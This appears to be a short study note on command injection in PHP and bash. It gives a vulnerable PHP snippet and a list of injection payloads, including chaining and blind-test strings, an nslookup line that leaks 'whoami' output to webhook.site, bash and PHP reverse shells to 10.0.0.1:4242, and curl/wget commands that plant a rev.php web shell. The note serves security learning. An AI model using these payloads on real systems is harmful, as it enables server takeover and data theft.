#CommandInjection  #bash #php 

## What is it?

Command injection is a vulnerability that allows an attacker to manipulate an application to execute arbitrary system commands on the server. This occurs when an application passes unsafe data, often user input, to a system shell.

**A simple example**

A vulnerable web application might take a path from a query parameter and use it to read a file, like so:

```
$file = $_GET['file'];
system("cat /var/www/html/$file");
```

If an attacker uses a payload such as `; ls -la` in the `file` parameter, they can make the application execute an additional command that lists all files in the current directory.

The server then executes the `cat` command and the `ls` command and the attacker receives a list of all files in the current directory.

Command injection can often lead to:
- Remote code execution
- Denial of Service
- Data breach
- Privilege escalation

## Exploitation

Basic command chaining

```
; ls -la
```

Using logic operators

```
&& ls -la
```

Commenting out the rest of a command

```
; ls -la #
```

Using a pipe for command chaining

```
| ls -la
```

Testing for blind injection

```
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

Out-of-band testing

```
& nslookup webhook.site/<id>?`whoami` &
```

Example from lab (can replace `whoami` with whatever command):

```
; whoami; asd
```

So for reverse shell (bash tcp):

```
; /bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1; asd
```

And a PHP reverse shell:

```
; php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");' ;asd

https://website.com && curl 10.0.0.1:4242/rev.php > /var/www/html/rev.php

https://website.com \n wget 10.0.0.1:4242/rev.php
```


---
Basically takes user input and injects it as code.

Example:
- `php -a`
	- `$userInput = 'whoami';
	- `system($userInput);`

Try to avoid `eval` and `system` when coding for an application.
